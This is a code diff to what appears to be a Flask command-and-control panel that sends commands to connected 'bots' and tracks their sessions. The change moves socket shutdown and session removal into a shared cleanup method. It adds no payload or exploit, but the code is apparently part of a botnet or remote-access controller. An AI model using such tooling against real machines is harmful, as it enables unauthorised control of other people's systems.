@@ -188,13 +188,8 @@ def send_command():
             except:
                 logging.warning(f"No termination confirmation from agent {session_id}")
             finally:
-                # Force cleanup
-                try:
-                    bot.target.shutdown(socket.SHUT_RDWR)
-                except:
-                    pass
-                bot.target.close()
-                del Bot.botList[session_id]
+                # Use the cleanup method to ensure removal
+                bot.cleanup()
                 logging.info(f"Agent {session_id} terminated and cleaned up")
                 return jsonify({
                     'success': True,
@@ -204,6 +199,8 @@ def send_command():
         # For other commands...
         response = bot.reliable_recv()
         if response is None:
+            # Connection lost, cleanup the bot
+            bot.cleanup()
             raise Exception("No response from agent")
             
         bot.update_last_seen()
@@ -217,13 +214,9 @@ def send_command():
         
     except Exception as e:
         logging.error(f"Error executing command on Session {session_id}: {e}")
-        # If there's an error and it was a quit command, ensure cleanup
-        if command == 'quit' and session_id in Bot.botList:
-            try:
-                bot.target.close()
-                del Bot.botList[session_id]
-            except:
-                pass
+        # If there's an error, ensure bot is cleaned up
+        if session_id in Bot.botList:
+            Bot.botList[session_id].cleanup()
         return jsonify({
             'error': f'Command execution failed: {str(e)}'
         }), 500
@@ -469,14 +462,8 @@ def force_remove_agent():
         return jsonify({'error': 'Invalid session ID'}), 400
         
     try:
-        # Force close the connection
-        bot = Bot.botList[session_id]
-        try:
-            bot.target.shutdown(socket.SHUT_RDWR)
-        except:
-            pass
-        bot.target.close()
-        del Bot.botList[session_id]
+        # Use the cleanup method to ensure removal
+        Bot.botList[session_id].cleanup()
         logging.info(f"Agent {session_id} forcefully removed")
         return jsonify({
             'success': True,
@@ -484,9 +471,12 @@ def force_remove_agent():
         })
     except Exception as e:
         logging.error(f"Error forcing removal of agent {session_id}: {e}")
-        # Still try to remove from list even if there's an error
+        # Double check cleanup
         if session_id in Bot.botList:
-            del Bot.botList[session_id]
+            try:
+                Bot.botList[session_id].cleanup()
+            except:
+                del Bot.botList[session_id]
         return jsonify({
             'error': f'Force removal failed: {str(e)}'
         }), 500
